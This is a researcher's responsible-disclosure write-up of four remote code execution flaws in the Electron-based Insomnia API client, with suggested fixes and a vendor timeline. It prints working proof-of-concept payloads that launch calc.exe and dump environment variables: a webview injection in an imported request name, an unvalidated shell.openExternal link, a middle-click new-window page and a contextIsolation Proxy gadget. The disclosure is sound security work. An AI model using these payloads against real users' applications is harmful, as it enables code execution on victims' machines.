# RCE Vulnerabilities in Insomnia Discovered

I took a look at [Insomnia](https://insomnia.rest/) after it was recommended to me as an alternative to Postman.
It is a tool for API, web application and web service development and testing.
Since it looked like an [Electron](https://www.electronjs.org/) application and I found critical vulnerabilities in other applications using this framework in the past, I was interested in checking their security.

I found four different ways a malicious actor could achieve code execution on a victims computer.
In general the way of exploitation would be:

- A malicious project file is created.
- Victim opens the file in Insomnia.

This follows the common use case of two (or more) co-workers share some project files and import a request collection in Insomnia.

The first vulnerability allows code execution directly after importing.
The other three require additional user interaction like clicking somewhere.

All were initially tested with:
- Insomnia Core 2020.5.1
- Insomnia 2021.1.1

OS: Windows 10



## RCE through missing sanitization / encoding upon project import

### Summary

Missing sanitization of the name-property of requests in request collection files allow remote code execution because of insecure evaluation of markup.
When a victim imports a malicious project file arbitrary code can be executed in the context of the current user.

### Description

The name field of a request will be inserted in the HTML code of the application without proper encoding when a description exists (see the "Docs"-tab).

The name of a request will be taken as the heading for the markdown description of a request.
In `markdown-preview.js` [line 98](https://github.com/Kong/insomnia/blob/7bc219422efe14054723c70d097ec53410db989c/packages/insomnia-app/app/ui/components/markdown-preview.js#L98) the heading will be inserted in a HTML-string together with the sanitized rendered markdown.
Later this string will be passed to `dangerouslySetInnerHTML` (React) in [line 105](https://github.com/Kong/insomnia/blob/7bc219422efe14054723c70d097ec53410db989c/packages/insomnia-app/app/ui/components/markdown-preview.js#L105) bypassing the encoding done by React.

When the request name field in Insomnia is set to `http://legitrequest<img/src=x>` we can notice that the image gets rendered (as error image because of the invalid URL) in the "Docs"-tab of the request.
Furthermore we can see the HTTP request for "x" in the devtools.

Because there is a CSP via meta tag in use:
```
default-src * insomnia://*; img-src blob: data: * insomnia://*; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src blob: data: mediastream: * insomnia://*;
```
... some further steps are necessary in order to achieve JavaScript execution in a context with node.js access.
We can not simply use some basic XSS payload because of the CSP and we can not simply use the alternative to redirect the main application page to a page under our control because of a `will-navigate`-handler in [packages/insomnia-app/app/main/window-utils.js](https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L107).
However, since we can inject in a top level `BrowserWindow` context which allows the `<webview>`-tag we can just use that and enable `nodeIntegration` on it.
Note: The `<webview>`-tag is furthermore not restricted by the CSP of an embedding page. 

We can achieve code execution by setting the name field of the request to something like this:

```html
http://legitrequest<img/src=x><webview src="data:text/html,<script>window.onload = ()=> {document.body.innerText = JSON.stringify(process.env);require('child_process').execSync('calc.exe');}</script>" webpreferences="allowRunningInsecureContent, javascript=yes" nodeintegration></webview>
```

This can be abused by an external attacker by creating a request that:
- contains the malicious payload (i.e. malware download or data exfiltration code) in the *name field*
- setting a description (content does not matter, this field just needs to be set and not be empty)
- exporting the project file and tricking a victim into opening it
When the project file is imported in Insomnia the payload will get executed automatically.
Similarly the malicious project file could just be hosted somewhere and an URL pointing to the file could be selected by the victim in Insomnia via import "From URL". 


### Steps to Reproduce

1. Open the proof of concept file in Insomnia: [PoC](insomnia-poc.json)

Alternative (manual):

1. Create a new Request.

2. Set the name of a request to `<webview src="data:text/html,<script>window.onload = ()=> {document.body.innerText = JSON.stringify(process.env);require('child_process').execSync('calc.exe');}</script>" webpreferences="allowRunningInsecureContent, javascript=yes" nodeintegration></webview>`.

3. In the Docs Tab click on "Add Description" and insert at least a single letter there. This will ensure that a description exists.

4. Export the request (Insomnia v4 JSON other formats should work as well).

5. Import the previously exported JSON file in a clean Insomnia instance (e.g. delete the previously created request before importing). 

The payload will be automatically executed as soon as a project file containing this payload is imported.
No user interaction is required.
Note: If you have already other requests and selected a specific request before importing, you need to select the imported one to trigger the payload.

![PoC - RCE missing sanitization](rce-import-request-collection-json.mp4)

### Suggested Solution

The name field of requests should be escaped or sanitized in order to prevent the initial XSS vulnerability by not allowing HTML/JavaScript code injection.
Furthermore other areas where `dangerouslySetInnerHTML` is used, should be reviewed if they are susceptible for this type of attack.



---


## RCE through insecure use of `shell.openExternal()`

### Summary

Link handlers of Insomnia lack validation, which allows attackers to execute arbitrary remote executables or binaries on the local system, when a victim clicks on a malicious link.

### Description

There are multiple locations where an attacker could provide malicious links.
For example the description field of requests (which were imported through a request collection file) or simply in the response view of an HTTP request.
They are then handled by the `shell.openExternal()` function in various places:

```
packages/insomnia-app/app/main/window-utils.js
packages/insomnia-app/app/ui/components/viewers/response-timeline-viewer.js
packages/insomnia-app/app/common/misc.js
packages/insomnia-app/app/ui/components/viewers/response-viewer.js
```

In each of them, an unvalidated URL is passed as argument.
An attacker could provide dangerous URLs, rendered as link.
When a user clicks on such a link, the attacker could achieve remote code execution.
In a simple example an attacker will provide a link to a `.exe`-file hosted on an SMB server under his/her control.
One possible location for malicious links would be the description field of requests which could be provided through a project file or in HTTP-responses to certain requests.

This does not only affect Windows, similar attacks are possible on other operating systems too.
A detailed description of various possible attack vectors for different OS can be found here: https://benjamin-altpeter.de/shell-openexternal-dangers/


### Steps to Reproduce

1. In the description field of a request under the "Docs" tab add the following markdown code:
   `[file](file:///C:/windows/system32/calc.exe)`
   
2. Click on the link in the rendered documentation ("Docs" tab).
   The calculator application should be spawned.

Note: This just shows the execution of a local file, however there are several possibilities for executing remote files, see: https://benjamin-altpeter.de/shell-openexternal-dangers/

For a video see the next vulnerability.

### Suggested Solution

Before passing any URLs to `shell.openExternal()` the protocol should be validated and only safe URLs should be passed to the function. For example only http(s)-Links could be forwarded.

See: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content



---




## RCE through unhandled middle mouse clicks and malicious links

### Summary

Insomnia does not handle clicks with middle mouse button so the default Electron behavior is used.
When a victim clicks a malicious link with the middle mouse button the application will open an Electron `BrowserWindow` which has `nodeIntegration` turned on, allowing the execution of arbitrary code.

### Description

In electron, clicks with the middle mouse button (mouse wheel) generate a separate event and can't be handled by registering an event handler for the `click` event.
Such a click will bypass the existing `click`-event handlers and by default will open a new electron `BrowserWindow`.
In the case of Insomnia we have access to the Node.js APIs in this new window through which we can execute arbitrary code.

### Steps to Reproduce

1. Create a html file with the following contents and host it somewhere:
```html
<html>
<head>
<script>
window.onload = ()=> {
document.body.innerText = JSON.stringify(process.env);
require('child_process').execSync('calc.exe');
}
</script>
</head>
<body>
test.html
</body>
</html>
```

2. Create a link to the file in the description of the "Docs" tab of a request.
   In this example the file was hosted at `http://localhost:8080/test.html`.

3. Click with the mouse wheel / middle mouse button on the link.
   A new window will open and will show the contents of `process.env`.
   Additionally the calculator will be spawned (on Windows).
   Arbitrary node.js code can be executed.

![PoC - insecure click handling](rce-insecure-click-handling.mp4)

### Suggested Solution

An event listener for the middle mouse button click event should be registered and the default action should be prevented.
Furthermore the creation of new windows should be validated: https://www.electronjs.org/docs/tutorial/security#13-disable-or-limit-creation-of-new-windows



---



## RCE through missing contextIsolation

### Summary

The webview for previewing and rendering HTTP-responses does not have [contextIsolation](https://www.electronjs.org/docs/tutorial/context-isolation) enabled. This allows remote attackers to execute arbitrary code if a user requests a malicious website or an attacker can perform a MitM-attack and alter the HTTP response.

### Description

By default the application allows the execution of JavaScript in HTML previews of HTTP-responses.
There is an option where a user can disable this behavior, but by default JavaScript is allowed.

When a HTML-like response for a request is received, a `ResponseWebview` element will be created: [response-viewer.js#L318](https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-viewer.js#L318)
This is basically a wrapper around the Electron `<webview>`-tag (see [response-web-view.js](https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-web-view.js) ) that loads the response converted to a data-URL.
In the `<webview>` only the option, whether JavaScript is enabled or not is set (`webpreferences="javascript=yes"`), the other options are inherited of the main window, where the following options are set: 
```js
webPreferences: {
    zoomFactor: zoomFactor,
    nodeIntegration: true,
    webviewTag: true,
    enableRemoteModule: true,
},
```
[window-utils.js#L66](https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L66)

The version of Electron that Insomnia uses is `9.1.1` as can be seen by navigating to "Help" > "About" in the application menu.
The default value of `contextIsolation` in this Electron version is `false`.

Missing `contextIsolation` allows an attacker to get access to Electron or Node.js APIs by overwriting JavaScript functions which might be later called in a context which has access to Node.js APIs.
By overwriting standard JavaScript functions like `Function.prototype.call`, the website which is loaded in the `<webview>` without access to Node.js APIs can get access to them when the overwritten function is executed in the context of Electron or application specific (in this case Insomnia) code.
For example when the overriden function is used in the application code and called with an object as argument that has access to the Nodes.js `child_process` module, it can be accessed inside the function provided as a replacement.
See this [link](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en) for the original details about exploiting missing `contextIsolation`.

So when a malicious website provides the following content for example:
```html
<html>
<head>
<script>
const handler = {
  apply: function(target, thisArg, argumentsList) {
    console.log(target, thisArg, argumentsList);
    if (argumentsList.length === 4 && argumentsList[3].name === "__webpack_require__") {
        argumentsList[3].m.module(Array.prototype)
        Array.prototype.exports.createRequire("/")("child_process").spawnSync("calc.exe")
    }
    return Reflect.apply(target, thisArg, argumentsList);
  }
};
Function.prototype.call = new Proxy(Function.prototype.call, handler);
</script>
</head>
<body>
<textarea contenteditable spellcheck="true">
clck and correkt mee
</textarea>
test.html
</body>
</html>
```

And a user sends a request to the website, then the user right clicks on the misspelled word and clicks on a suggestion, the attackers payload will get executed.

In this case a npm package called "electron-context-menu", is utilized.
It is created in the [main window](https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L501) and also affects subwindows like the webview.
It simply adds a context menu with a few default features.
One of those is responsible for correcting misspelled words by right clicking on the word and choosing one of the suggested corrections.

Practically this needs many steps from a potential victim and can be considered a more theretical example.
However, this is just one possible execution chain, there might be further "gadgets" which would allow code execution even without any user interaction at all.


### Steps to Reproduce

1. Start a local webserver which serves the following HTML-file:
```html
<html>
<head>
<script>
const handler = {
  apply: function(target, thisArg, argumentsList) {
    console.log(target, thisArg, argumentsList);
    if (argumentsList.length === 4 && argumentsList[3].name === "__webpack_require__") {
        argumentsList[3].m.module(Array.prototype)
        Array.prototype.exports.createRequire("/")("child_process").spawnSync("calc.exe")
    }
    return Reflect.apply(target, thisArg, argumentsList);
  }
};
Function.prototype.call = new Proxy(Function.prototype.call, handler);
</script>
</head>
<body>
<textarea contenteditable spellcheck="true">
clck and correkt mee
</textarea>
test.html
</body>
</html>
```

2. In Insomnia create a new request targeting the URL where the file from step 1 is located.

3. Send the request.

4. Right click on a misspelled word in the textarea and then click on one of the suggested words in the contextmenu.

![PoC - missing contextIsolation](rce-missing-contextisolation.mp4)

### Suggested Solution

The option `contextIsolation` should be set to `true`, especially in the webview for rendering HTML previews of HTTP-responses.
See: https://www.electronjs.org/docs/tutorial/security#3-enable-context-isolation-for-remote-content




---



## Conclusion

Several vulnerabilities which an attacker could abuse to achieve code execution were identified and disclosed privately to the vendor.
However, they were not taken seriously at first, which was quite disappointing.
Multiple requests were made and a lot of time passed until the vulnerabilities got fixed as you can see in the timeline below.
In the end at least they attributed the findings in the changelog to me.

Note: I did not test the fixes...


Timeline:

- 07.12.2020 Contacted support@insomnia.rest
- 07.12.2020 Vulnerability details sent
- 14.12.2020 requesting update - response: "... raised on internal tracker and should get fixed shortly."
- 03.03.2021 Version 2021.1.0 released without security fixes
- 10.03.2021 Version 2021.1.1 released without security fixes
- 23.03.2021 Asking why vulnerabilities are still not fixed, sending updated information and 4th vulnerability description - response: "... should post issues on Github ..."
- 23.03.2021 Explaining the dangers of publicly posting them - response: "... raised them in our internal tracker again and are being prioritized ..."
- 29.06.2021 Version 2021.4.0 released with one fix (https://insomnia.rest/changelog#2021.4.0)
- 12.07.2021 Requesting status update
- 25.08.2021 Version 2021.5.0 released with two more fixes according to changelog (https://insomnia.rest/changelog#2021.5.0)




---

Changelog:
- 30.12.2020 Initial writeup of the first 3 vulnerabilities
- 22.03.2021 Added `contextIsolation` vulnerability
- 03.01.2022 published post